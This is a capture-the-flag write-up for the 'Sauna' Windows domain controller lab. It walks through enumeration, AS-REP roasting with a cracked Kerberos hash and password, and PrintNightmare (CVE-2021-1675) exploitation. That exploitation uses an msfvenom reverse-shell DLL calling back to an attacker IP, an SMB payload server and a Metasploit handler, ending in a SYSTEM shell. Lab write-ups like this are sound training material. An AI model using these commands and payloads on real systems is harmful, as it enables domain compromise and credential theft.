# Sauna - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed standard Active Directory services:
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
```

### Domain Information
From the scan results, I identified domain information:
```
NetBIOS computer name: SAUNA
NetBIOS domain name: EGOTISTICALBANK
DNS domain: EGOTISTICAL-BANK.LOCAL
FQDN: SAUNA.EGOTISTICAL-BANK.LOCAL
```

### Web Enumeration
I examined the website running on port 80 and found an "About Us" page with employee information. This could be valuable for username enumeration:
```bash
curl -s http://10.129.95.180/about.html | grep -i "team"
```

I used cewl to generate a wordlist from the website content:
```bash
cewl http://10.129.95.180/ -w website_words.txt
```

## Gaining Initial Access

### AS-REP Roasting
First, I attempted AS-REP Roasting using potential usernames generated from the website:
```bash
GetNPUsers.py egotistical-bank.local/ -usersfile users.txt -request
```

This initially returned no results, so I created a more targeted list based on employee names found on the "About Us" page, following common username formats:
```
fsmith
hsmith
scoins
ferguss
fergs
fsmit
hsmit
```

Running the AS-REP Roasting attack again, I successfully obtained a hash for user fsmith:
```bash
GetNPUsers.py egotistical-bank.local/ -usersfile employee_names.txt -request
```

This yielded a Kerberos AS-REP hash:
```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:1e39a1ecae838d452543f116f6f67fb0$241a512a4b745a997f5ec28957ec15ddd05f7d18f942ec3d522a35fb4e34c5752e0a2f13f6dd88ef5d0d231347f999a443209725b47f1985a3e48aabfde7458cac7cf16d9e89277abdcffd22496076ad228b68caba67a872ad4d460c4ecfa90d02f4ba8175f5f2fec4893216b80f23830723a474577b864c6bb3f8993cc0ddb2187c5e1459712ae1b5e3ff636d00cc7e5c0f164672277447c14dd6f6149c28e9ae04ce12316173f44f16fde22dc903ac6dc9260c1dab25b3362b02388080fb2b528cd83fcd9052c0fea0047687cc6dc0d0fdc42e581c2a1609d513a38d589cf8e1aeba3a1fb222e09bd09d2bf904778dbaba0a1c8dca28eaeadc8d21e9e5ae8a
```

### Password Cracking
I saved the hash to a file and used hashcat to crack it:
```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

This revealed the password:
- **Username**: fsmith
- **Password**: Thestrokes23

### Post-Authentication Enumeration
With valid credentials, I enumerated available SMB shares:
```bash
smbclient -L //10.129.95.180/ -U egotistical-bank.local/fsmith
```

This revealed several shares:
```
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
print$          Disk      Printer Drivers
RICOH Aficio SP 8300DN PCL 6   Printer   We cant print money
SYSVOL          Disk      Logon server share
```

The presence of a printer share was particularly interesting, suggesting a potential PrintNightmare vulnerability.

## Privilege Escalation

### Exploiting PrintNightmare
After confirming that the target was vulnerable to PrintNightmare (CVE-2021-1675), I prepared for the attack:

1. Generated a malicious DLL payload:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.42 LPORT=4444 -f dll -o payload.dll
```

2. Started an SMB server to host the payload:
```bash
smbserver.py share . -smb2support
```

3. Set up a Metasploit handler to receive the connection:
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.16.42; set lport 4444; exploit"
```

4. Exploited the PrintNightmare vulnerability:
```bash
python3 CVE-2021-1675.py egotistical-bank.local/fsmith:Thestrokes23@10.129.95.180 '\\10.10.16.42\share\payload.dll'
```

### Post-Exploitation
After gaining a SYSTEM shell through the PrintNightmare exploit, I verified my access:
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

I was able to navigate to sensitive locations and collect high-value information:
```bash
meterpreter > cd C:/Users/Administrator/Desktop
meterpreter > cat root.txt
```

This confirmed complete compromise of the domain controller, successfully completing the challenge.